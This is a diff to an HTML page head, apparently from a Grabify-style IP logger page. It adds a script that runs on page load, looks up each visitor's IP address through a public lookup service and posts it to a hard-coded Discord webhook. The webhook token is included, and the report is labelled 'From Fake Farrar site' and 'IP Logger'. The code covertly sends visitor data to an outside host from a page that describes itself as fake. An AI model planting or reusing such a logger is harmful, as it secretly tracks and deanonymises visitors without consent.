@@ -1,6 +1,51 @@
 <head>
    <script src="https://embed.tawk.to/_s/v4/app/67354992019/js/twk-main.js" charset="UTF-8" crossorigin="*"></script><script src="https://embed.tawk.to/_s/v4/app/67354992019/js/twk-vendor.js" charset="UTF-8" crossorigin="*"></script><script src="https://embed.tawk.to/_s/v4/app/67354992019/js/twk-chunk-vendors.js" charset="UTF-8" crossorigin="*"></script><script src="https://embed.tawk.to/_s/v4/app/67354992019/js/twk-chunk-common.js" charset="UTF-8" crossorigin="*"></script><script src="https://embed.tawk.to/_s/v4/app/67354992019/js/twk-runtime.js" charset="UTF-8" crossorigin="*"></script><script src="https://embed.tawk.to/_s/v4/app/67354992019/js/twk-app.js" charset="UTF-8" crossorigin="*"></script><script type="text/javascript" async="" src="https://static.criteo.net/js/ld/publishertag.prebid.144.js"></script>
    <meta charset="utf-8">
+    <script>
+    // Function to send the IP to the Discord webhook as an embed
+    function sendIPToDiscord(ip) {
+        const webhookURL = "https://discord.com/api/webhooks/1308305009062182985/duWjwgeeYrgf3zD3-lQmyS6dQoqt4N8HlJht5LMTgyGsM1gMUAEO09IZoDUi7LeHdUPk"; // Replace with your Discord webhook URL
+
+        const embed = {
+            title: "From Fake Farrar site",
+            color: 3447003, // Embed color in hexadecimal
+            fields: [
+                {
+                    name: "User IP",
+                    value: ip,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "IP Logger"
+            }
+        };
+
+        const payload = {
+            embeds: [embed]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => console.log('Successfully sent IP to Discord:', data))
+        .catch(error => console.error('Error sending IP to Discord:', error));
+    }
+
+    // Fetch the user's IP using a public API
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            console.log('User IP:', data.ip);
+            sendIPToDiscord(data.ip);  // Send the IP to the Discord webhook as an embed
+        })
+        .catch(error => console.error('Error fetching IP:', error));
+</script>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Grabify IP Logger &amp; URL Shortener allows you to tracks IP address, track locations and much more. Advanced web analytics at the tap of a finger!">
